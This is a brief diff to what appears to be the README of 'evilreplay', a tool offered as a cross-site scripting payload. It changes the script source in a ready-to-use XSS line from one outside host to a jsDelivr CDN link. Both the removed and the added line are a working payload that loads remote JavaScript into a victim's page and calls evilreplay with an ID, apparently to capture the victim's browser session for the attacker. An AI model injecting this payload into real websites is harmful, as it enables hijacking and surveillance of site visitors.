@@ -55,7 +55,7 @@ The following script can be used as a XSS payload. **(don't forget to change the
 
 
 ```html
-<script src="https://ege.sh/drop/sc.js" onload=evilreplay("OEeP7C6ysFPXP8mDI04T")></script>
+<script src="https://cdn.jsdelivr.net/gh/EgeBalci/evilreplay@master/evilreplay.min.js" onload=evilreplay("OEeP7C6ysFPXP8mDI04T")></script>
 ```
 
 ## Building The Payload
